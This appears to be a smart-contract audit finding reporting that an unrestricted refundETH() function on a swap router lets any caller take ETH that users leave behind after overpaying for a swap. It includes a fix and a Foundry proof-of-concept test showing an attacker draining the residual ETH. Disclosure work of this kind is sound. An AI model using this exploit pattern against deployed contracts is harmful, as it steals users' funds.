### Title
Unguarded `refundETH()` lets any caller drain residual ETH left on the router after a payable swap — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`refundETH()` is an unrestricted `external payable` function that transfers the router's entire ETH balance to `msg.sender`. Because `exactInputSingle`, `exactInput`, `exactOutputSingle`, and `exactOutput` are all `payable` and the `pay()` helper wraps only the exact amount the pool requests (leaving any excess native ETH on the contract), any ETH that is not consumed in the same atomic multicall is permanently claimable by an arbitrary caller.

---

### Finding Description

`PeripheryPayments.refundETH()` contains no access control and no stored-recipient check:

```solidity
// metric-periphery/contracts/base/PeripheryPayments.sol  lines 58-63
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // ← sends to whoever calls this
    }
}
``` [1](#0-0) 

The `pay()` helper, when `token == WETH`, wraps only the exact amount the pool callback requests and leaves any surplus native ETH on the contract:

```solidity
// lines 73-77
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    }
``` [2](#0-1) 

All four swap entry-points are `external payable`: [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) 

The intended safe pattern is `multicall{value}([swap(...), refundETH()])` — the test suite confirms this explicitly: [7](#0-6) 

However, the contract imposes no enforcement that `refundETH()` is called atomically in the same multicall. A user who:

1. calls `exactInputSingle{value: V}(amountIn: A)` where `V > A` (common — users send a buffer), **or**
2. calls `multicall{value: V}([exactInputSingle(amountIn: A)])` and omits `refundETH()`, **or**
3. hits a `priceLimitX64` that causes the pool to consume less than `amountIn`

…leaves `V − A` (or `V − actualConsumed`) ETH on the router. Any address can then call `refundETH()` in a separate transaction and receive that ETH.

The `receive()` guard (`if (msg.sender != WETH) revert NotWETH()`) only blocks bare ETH pushes; it does not prevent ETH from arriving via `msg.value` in a payable function call, so the stranding path is always open. [8](#0-7) 

---

### Impact Explanation

Direct loss of user ETH. Any residual native ETH on the router — from overpayment or a price-limit-truncated exact-input swap — is immediately claimable by an unprivileged attacker. The victim receives no refund and the attacker receives the full stranded balance. This is a direct principal loss above Sherlock Medium thresholds.

---

### Likelihood Explanation

Moderate. The `pay()` function explicitly handles the `nativeBalance >= value` case (i.e., the user sent more ETH than the swap needs), which is a normal and documented usage pattern. The `IMetricOmmPoolLiquidityAdder` NatSpec even documents the multicall+refundETH pattern as the expected flow, meaning users are expected to send excess ETH regularly. A MEV bot monitoring the mempool can back-run any transaction that leaves ETH on the router. [9](#0-8) 

---

### Recommendation

Replace the `msg.sender` recipient in `refundETH()` with a caller-supplied `address recipient` parameter (matching the pattern already used by `unwrapWETH9` and `sweepToken`), so the original transaction sender can specify where the refund goes and an attacker calling in a separate transaction cannot redirect it to themselves.

Alternatively, enforce that `refundETH()` can only be called from within an active `multicall` context (e.g., via a reentrancy-style flag set at `multicall` entry).

---

### Proof of Concept

```solidity
// Foundry test sketch
function test_attacker_steals_residual_eth() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");
    vm.deal(victim, 2 ether);

    // Victim calls exactInputSingle directly with 2 ETH but amountIn = 1000 wei.
    // pay() wraps 1000 wei; ~2 ETH - 1000 wei stays on router.
    vm.prank(victim);
    router.exactInputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1000,
            amountOutMinimum: 0,
            recipient: victim,
            deadline: block.timestamp + 60,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // Router now holds ~2 ether - 1000 wei of residual ETH.
    assertGt(address(router).balance, 0, "residual eth on router");

    // Attacker calls refundETH() in a separate transaction.
    vm.prank(attacker);
    router.refundETH();

    // Attacker received victim's residual ETH.
    assertGt(attacker.balance, 0, "attacker stole eth");
    assertEq(address(router).balance, 0, "router drained");
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-77)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-67)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L92-92)
```text
  function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L130-130)
```text
  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L154-154)
```text
  function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn) {
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```

**File:** metric-periphery/contracts/interfaces/IMetricOmmPoolLiquidityAdder.sol (L16-17)
```text
///      `multicall{value}`) when the pool's WETH leg is token0 or token1; unused ETH can be reclaimed via
///      `refundETH` in the same multicall.
```
